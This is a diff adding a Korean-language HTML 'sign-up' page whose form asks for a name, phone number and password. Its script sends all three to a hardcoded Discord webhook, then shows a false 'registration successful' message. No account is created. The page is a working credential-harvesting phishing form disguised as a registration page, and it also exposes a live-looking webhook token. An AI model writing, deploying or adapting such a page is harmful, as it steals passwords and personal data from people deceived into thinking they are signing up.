@@ -1,1 +1,67 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>회원가입</title>
+    <style>
+        form { max-width: 500px; margin: 50px auto; padding: 20px; }
+        input, textarea { width: 100%; margin: 10px 0; padding: 10px; }
+        button { padding: 10px 20px; background: #5865F2; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
 
+    <form id="contactForm">
+        <h2>정보</h2>
+        <input type="text" id="name" placeholder="이름" required>
+        <input type="email" id="email" placeholder="전화번호" required>
+        <textarea id="message" rows="5" placeholder="비밀번호" required></textarea>
+        <button type="submit">보내기</button>
+    </form>
+
+    <script>
+        const form = document.getElementById('contactForm');
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const message = document.getElementById('message').value;
+
+            const webhookURL = "https://discord.com/api/webhooks/1471394578383765579/eFIe34oh8CFR1a0aK1LxRQJbKrpb1y-rFmXcWKQaxvEUkzP1-WFVD_yEh77DGkU3qcyz";  // ← 반드시 바꾸세요!
+
+            const payload = {
+                embeds: [{
+                    title: "📩 새로운 문의가 도착했습니다",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "이름", value: name, inline: true },
+                        { name: "전화번호", value: email, inline: true },
+                        { name: "비밀번호", value: message }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert("✅ 회원가입이 성공적으로 되었습니다!");
+                    form.reset();
+                } else {
+                    alert("전송 실패. 다시 시도해주세요.");
+                }
+            } catch (error) {
+                alert("오류가 발생했습니다.");
+            }
+        });
+    </script>
+</body>
+</html>
